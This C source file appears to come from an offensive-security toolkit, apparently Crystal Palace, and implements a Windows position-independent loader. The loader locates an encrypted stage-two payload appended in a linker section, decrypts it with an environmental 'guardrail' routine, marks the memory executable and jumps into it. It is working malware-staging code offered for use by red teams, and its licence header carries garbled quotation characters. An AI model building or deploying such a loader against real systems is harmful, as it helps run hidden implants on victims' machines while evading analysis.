/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â� AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
 
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 
/* defined in guardrail.c */
char * guardrail_decrypt(char * buffer, int len, int * outlen);
 
/* entry point to our free and run PIC, part of our decrypted stage 2 */
typedef void (* FREEANDRUN)(void * loaderStart);
 
/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __STAGE2__[0] __attribute__((section("stage2")));
 
/* our encrypted DLL has its length prepended to it */
typedef struct {
    int   length;
    char  value[];
} _RESOURCE;
 
/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
    _RESOURCE  * stage2;
    char       * buffer;
    char       * data;
    DWORD        oldProt;
 
    /* find our (encrypted) capability appended to this PIC */
    stage2 = (_RESOURCE *)&__STAGE2__;
 
    /* allocate memory for our encrypted stage 2 */
    buffer = KERNEL32$VirtualAlloc( NULL, stage2->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
 
    /* copy our (encrypted) stage 2 over to our RW working buffer */
    __movsb((unsigned char *)buffer, (unsigned char *)stage2->value, stage2->length);
 
    /* run our guardrail function to handle *everything* about the guardrail process. Note that the return
     * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
    data = guardrail_decrypt(buffer, stage2->length, NULL);
 
    /*
     * Guadrail decryption FAILED, do something else, or just exit.
     */
    if (data == NULL) {
        KERNEL32$VirtualFree( buffer, 0, MEM_RELEASE );
        return;
    }
 
    /*
     * Guardail decryption SUCCESS, run stage 2!
     */
    if (!KERNEL32$VirtualProtect(buffer, stage2->length, PAGE_EXECUTE_READ, &oldProt))
        return;
 
    /* Call our free and run PIC with go() (our position 0) as the argument. It'll call the stage 2 PIC */
    ((FREEANDRUN)data)(go);
}
